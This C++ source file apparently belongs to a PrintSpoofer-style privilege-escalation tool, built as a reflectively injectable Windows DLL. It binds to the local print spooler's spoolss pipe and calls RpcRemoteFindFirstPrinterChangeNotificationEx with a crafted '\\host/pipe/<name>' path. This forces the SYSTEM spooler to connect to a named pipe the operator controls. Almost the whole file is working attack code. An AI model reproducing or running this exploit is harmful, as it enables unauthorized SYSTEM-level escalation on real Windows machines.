#include <iostream>
#include <Windows.h>
#include <strsafe.h>
#include "ms-rprn_h.h"
#include "ReflectiveLoader.h"
#include "patch.h"

#include <iostream>
#include <sstream>
#include <fstream>

#pragma comment(lib, "rpcrt4.lib")

extern HINSTANCE hAppInstance;

DWORD WINAPI TriggerNamedPipeConnection(LPWSTR lpParam)
{
	HRESULT hr = NULL;
	PRINTER_HANDLE hPrinter = NULL;
	DEVMODE_CONTAINER devmodeContainer = { 0 };

	LPWSTR pwszComputerName = NULL;
	DWORD dwComputerNameLen = MAX_COMPUTERNAME_LENGTH + 1;

	LPWSTR pwszTargetServer = NULL;
	LPWSTR pwszCaptureServer = NULL;

	LPWSTR pwszPipeName = lpParam;

	pwszComputerName = (LPWSTR)malloc(dwComputerNameLen * sizeof(WCHAR));
	if (!pwszComputerName)
		goto cleanup;

	if (!GetComputerName(pwszComputerName, &dwComputerNameLen))
		goto cleanup;

	pwszTargetServer = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
	if (!pwszTargetServer)
		goto cleanup;

	pwszCaptureServer = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
	if (!pwszCaptureServer)
		goto cleanup;

	StringCchPrintf(pwszTargetServer, MAX_PATH, L"\\\\%ws", pwszComputerName);
	StringCchPrintf(pwszCaptureServer, MAX_PATH, L"\\\\%ws/pipe/%ws", pwszComputerName, pwszPipeName);

	RpcTryExcept
	{
		if (RpcOpenPrinter(pwszTargetServer, &hPrinter, NULL, &devmodeContainer, 0) == RPC_S_OK)
		{
			RpcRemoteFindFirstPrinterChangeNotificationEx(hPrinter, PRINTER_CHANGE_ADD_JOB, 0, pwszCaptureServer, 0, NULL);
			RpcClosePrinter(&hPrinter);
			wprintf(L"[+] Triggered named pipe connection to %ls\n", pwszCaptureServer);
		}
	}
	RpcExcept(EXCEPTION_EXECUTE_HANDLER);
	{
		// Expect RPC_S_SERVER_UNAVAILABLE
	}
	RpcEndExcept;

cleanup:
	if (pwszComputerName)
		free(pwszComputerName);
	if (pwszTargetServer)
		free(pwszTargetServer);
	if (pwszCaptureServer)
		free(pwszCaptureServer);
	if (hPrinter)
		RpcClosePrinter(&hPrinter);

	return 0;
}

handle_t __RPC_USER STRING_HANDLE_bind(STRING_HANDLE lpStr)
{
	RPC_STATUS RpcStatus;
	RPC_WSTR StringBinding;
	handle_t BindingHandle;

	if (RpcStringBindingComposeW((RPC_WSTR)L"12345678-1234-ABCD-EF00-0123456789AB", (RPC_WSTR)L"ncacn_np", (RPC_WSTR)lpStr, (RPC_WSTR)L"\\pipe\\spoolss", NULL, &StringBinding) != RPC_S_OK)
		return NULL;

	RpcStatus = RpcBindingFromStringBindingW(StringBinding, &BindingHandle);

	RpcStringFreeW(&StringBinding);

	if (RpcStatus != RPC_S_OK)
		return NULL;

	return BindingHandle;
}

void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE lpStr, handle_t BindingHandle)
{
	RpcBindingFree(&BindingHandle);
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	LPWSTR pwszParams = NULL;
	size_t convertedChars = 0;
	size_t newsize = 0;
	char* args = NULL;

	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE*)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		if (lpReserved != NULL) {
			// Process arguments
			pwszParams = (LPWSTR)calloc(strlen((LPSTR)lpReserved) + 1, sizeof(WCHAR));
			newsize = strlen((LPSTR)lpReserved) + 1;
			mbstowcs_s(&convertedChars, pwszParams, newsize, (LPSTR)lpReserved, _TRUNCATE);
			TriggerNamedPipeConnection(pwszParams);
			fflush(stdout);
			ExitProcess(0);
		}
		else {
			args = (char*)patchme + 7;
			if (args[0] != '\0') {
				// Load from patched args
				pwszParams = (LPWSTR)calloc(strlen((LPSTR)args) + 1, sizeof(WCHAR));
				newsize = strlen((LPSTR)args) + 1;
				mbstowcs_s(&convertedChars, pwszParams, newsize, (LPSTR)args, _TRUNCATE);
				TriggerNamedPipeConnection(pwszParams);
			}
		}
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}

